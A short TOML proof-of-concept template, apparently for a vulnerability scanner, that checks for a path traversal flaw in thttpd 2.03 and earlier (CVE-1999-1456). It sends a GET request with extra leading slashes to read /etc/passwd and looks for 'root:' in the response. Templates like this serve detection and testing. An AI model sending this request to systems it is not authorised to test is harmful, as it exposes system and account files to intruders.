[info]
author = "ave"
description = "thttpd 2.03及更早版本存在路径遍历漏洞，攻击者通过发送包含多个前导斜杠(/)的GET请求可读取服务器上的任意文件"
id = "POC-AVE-1999-1114"
name = "CVE-1999-1456 PoC"
severity = "medium"
tags = [
    "cve-1999-1456",
    "ave-1999-1114",
]
vuln_id = [
    "CVE-1999-1456",
    "AVE-1999-1114",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}//etc/passwd"
protocol = "http"

[poc.requests.headers]
Connection = "close"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
